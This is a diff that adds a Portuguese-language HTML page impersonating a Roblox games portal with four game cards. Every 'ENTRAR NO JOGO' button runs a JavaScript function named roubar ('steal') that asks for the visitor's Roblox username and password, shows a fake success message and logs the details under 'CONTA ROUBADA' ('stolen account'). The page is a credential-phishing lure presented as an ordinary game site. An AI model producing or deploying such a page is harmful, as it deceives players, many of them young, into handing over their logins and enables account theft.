@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBLOX - Jogos Online</title>
+    <style>
+        body { margin:0; background: #0f0f0f; color:#fff; font-family: Arial; }
+        header { background: #1e1e1e; padding: 15px; text-align:center; font-size: 24px; }
+        .games { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; padding: 30px; max-width: 1200px; margin: auto; }
+        .game-box { background: #1f1f1f; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 20px rgba(255,0,0,0.3); }
+        .game-box img { width: 100%; height: 220px; object-fit: cover; }
+        .info { padding: 15px; text-align: center; }
+        .info h3 { margin: 8px 0; color: #ffcc00; }
+        .btn-roubar { background: #ff0000; color: white; border: none; padding: 12px; width: 90%; margin: 10px auto; display: block; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn-roubar:hover { background: #cc0000; }
+    </style>
+</head>
+<body>
+    <header>🎮 ROBLOX - Jogos Online</header>
+    
+    <div class="games">
+        <!-- Jogo 1 -->
+        <div class="game-box">
+            <img src="https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=142823291" alt="Mega Mansion Tycoon">
+            <div class="info">
+                <h3>Mega Mansion Tycoon</h3>
+                <button class="btn-roubar" onclick="roubar('Mega Mansion Tycoon')">ENTRAR NO JOGO</button>
+            </div>
+        </div>
+
+        <!-- Jogo 2 -->
+        <div class="game-box">
+            <img src="https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4483381580" alt="Crazy Obby">
+            <div class="info">
+                <h3>Crazy Obby</h3>
+                <button class="btn-roubar" onclick="roubar('Crazy Obby')">ENTRAR NO JOGO</button>
+            </div>
+        </div>
+
+        <!-- Jogo 3 -->
+        <div class="game-box">
+            <img src="https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=5352784794" alt="Abandoned Island">
+            <div class="info">
+                <h3>Abandoned Island</h3>
+                <button class="btn-roubar" onclick="roubar('Abandoned Island')">ENTRAR NO JOGO</button>
+            </div>
+        </div>
+
+        <!-- Jogo 4 -->
+        <div class="game-box">
+            <img src="https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=6284583030" alt="Pro Racing">
+            <div class="info">
+                <h3>Pro Racing</h3>
+                <button class="btn-roubar" onclick="roubar('Pro Racing')">ENTRAR NO JOGO</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function roubar(jogo) {
+            const username = prompt("Usuário Roblox para entrar em " + jogo + ":");
+            if (!username) return;
+            
+            const password = prompt("Senha Roblox:");
+            if (!password) return;
+
+            alert("Conectando ao servidor de " + jogo + "...\n\nConta vinculada com sucesso!");
+            
+            console.log("=== CONTA ROUBADA ===");
+            console.log("Jogo:", jogo);
+            console.log("Username:", username);
+            console.log("Senha:", password);
+        }
+    </script>
+</body>
+</html>
